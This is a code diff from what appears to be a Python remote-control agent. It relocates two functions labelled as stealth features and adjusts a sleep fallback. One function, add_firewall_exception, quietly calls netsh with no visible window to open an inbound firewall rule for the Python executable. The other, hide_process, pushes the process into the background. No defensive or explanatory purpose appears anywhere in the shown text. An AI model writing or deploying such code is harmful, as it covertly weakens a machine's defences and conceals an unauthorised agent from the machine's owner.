@@ -144,44 +144,6 @@ try:
 except ImportError:
     log_message("eventlet not available", "warning")
 
-# Stealth functions
-def hide_process():
-    """Basic process hiding."""
-    if not WINDOWS_AVAILABLE:
-        log_message("Windows-specific functionality not available", "warning")
-        return False
-    if not PSUTIL_AVAILABLE:
-        log_message("psutil not available, cannot hide process", "warning")
-        return False
-        
-    try:
-        # Set process to run in background with low priority
-        process = psutil.Process()
-        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
-        return True
-    except Exception as e:
-        log_message(f"Failed to hide process: {e}", "error")
-        return False
-
-def add_firewall_exception():
-    """Basic firewall exception."""
-    if not WINDOWS_AVAILABLE:
-        log_message("Windows-specific functionality not available", "warning")
-        return False
-        
-    try:
-        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
-        rule_name = f"Python Agent {uuid.uuid4()}"
-        subprocess.run([
-            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-            f'name={rule_name}', 'dir=in', 'action=allow',
-            f'program={current_exe}'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-        return True
-    except Exception as e:
-        log_message(f"Failed to add firewall exception: {e}", "error")
-        return False
-
 # Standard library imports
 import requests
 import time
@@ -366,6 +328,44 @@ def check_system_requirements():
         log_message(f"Optional features available: {', '.join(available_optional)}")
     
     return len(missing_critical) == 0
+
+# --- Stealth Functions (moved here after imports) ---
+def hide_process():
+    """Basic process hiding."""
+    if not WINDOWS_AVAILABLE:
+        log_message("Windows-specific functionality not available", "warning")
+        return False
+    if not PSUTIL_AVAILABLE:
+        log_message("psutil not available, cannot hide process", "warning")
+        return False
+        
+    try:
+        # Set process to run in background with low priority
+        process = psutil.Process()
+        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
+        return True
+    except Exception as e:
+        log_message(f"Failed to hide process: {e}", "error")
+        return False
+
+def add_firewall_exception():
+    """Basic firewall exception."""
+    if not WINDOWS_AVAILABLE:
+        log_message("Windows-specific functionality not available", "warning")
+        return False
+        
+    try:
+        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
+        rule_name = f"Python Agent {uuid.uuid4()}"
+        subprocess.run([
+            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+            f'name={rule_name}', 'dir=in', 'action=allow',
+            f'program={current_exe}'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+        return True
+    except Exception as e:
+        log_message(f"Failed to add firewall exception: {e}", "error")
+        return False
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -3350,8 +3350,10 @@ def sleep_random_non_blocking():
         sleep_time = random.uniform(0.5, 2.0)
         eventlet.sleep(sleep_time)
     except ImportError:
-        # Fallback to regular sleep if eventlet not available
-        sleep_random()
+        # Fallback to shorter sleep or skip if eventlet not available
+        log_message("eventlet not available for non-blocking sleep, using shorter delay", "warning")
+        sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
+        time.sleep(sleep_time)
 
 # --- Agent State ---
 STREAMING_ENABLED = False
